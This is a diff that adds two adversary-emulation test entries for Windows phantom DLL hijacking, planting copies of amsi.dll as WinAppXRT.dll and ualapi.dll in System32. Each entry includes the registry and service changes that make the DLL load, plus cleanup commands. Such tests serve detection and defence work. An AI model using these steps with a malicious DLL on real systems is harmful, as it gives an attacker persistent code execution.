@@ -20,3 +20,46 @@ atomic_tests:
       del %APPDATA%\amsi.dll >nul 2>&1
     name: command_prompt
     elevation_required: true
+- name: Phantom Dll Hijacking - WinAppXRT.dll
+  auto_generated_guid: 46ed938b-c617-429a-88dc-d49b5c9ffedb
+  description: |
+    .NET components (a couple of DLLs loaded anytime .NET apps are executed) when they are loaded they look for an environment variable called APPX_PROCESS
+    Setting the environmental variable and dropping the phantom WinAppXRT.dll in e.g. c:\windows\system32 (or any other location accessible via PATH) will ensure the 
+    WinAppXRT.dll is loaded everytime user launches an application using .NET.
+
+    Upon successful execution, amsi.dll will be copied and renamed to WinAppXRT.dll and then WinAppXRT.dll will be copied to system32 folder for loading during execution of any .NET application.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
+      ren %APPDATA%\amsi.dll WinAppXRT.dll
+      copy %APPDATA%\WinAppXRT.dll %windir%\System32\WinAppXRT.dll
+      reg add "HKEY_CURRENT_USER\Environment" /v APPX_PROCESS /t REG_EXPAND_SZ /d "1" /f
+    cleanup_command: |
+      reg delete "HKEY_CURRENT_USER\Environment" /v APPX_PROCESS /f
+      del %windir%\System32\WinAppXRT.dll
+      del %APPDATA%\WinAppXRT.dll
+    name: command_prompt
+    elevation_required: true    
+- name: Phantom Dll Hijacking - ualapi.dll
+  auto_generated_guid: 5898902d-c5ad-479a-8545-6f5ab3cfc87f
+  description: |
+    Re-starting the Print Spooler service leads to C:\Windows\System32\ualapi.dll being loaded
+    A malicious ualapi.dll placed in the System32 directory will lead to its execution whenever the system starts
+
+    Upon successful execution, amsi.dll will be copied and renamed to ualapi.dll and then ualapi.dll will be copied to system32 folder for loading during system restart.
+    Print Spooler service is also configured to auto start. Reboot of system is required
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
+      ren %APPDATA%\amsi.dll ualapi.dll
+      copy %APPDATA%\ualapi.dll %windir%\System32\ualapi.dll
+      sc config Spooler start=auto
+    cleanup_command: |
+      del %windir%\System32\ualapi.dll
+      del %APPDATA%\ualapi.dll
+    name: command_prompt
+    elevation_required: true
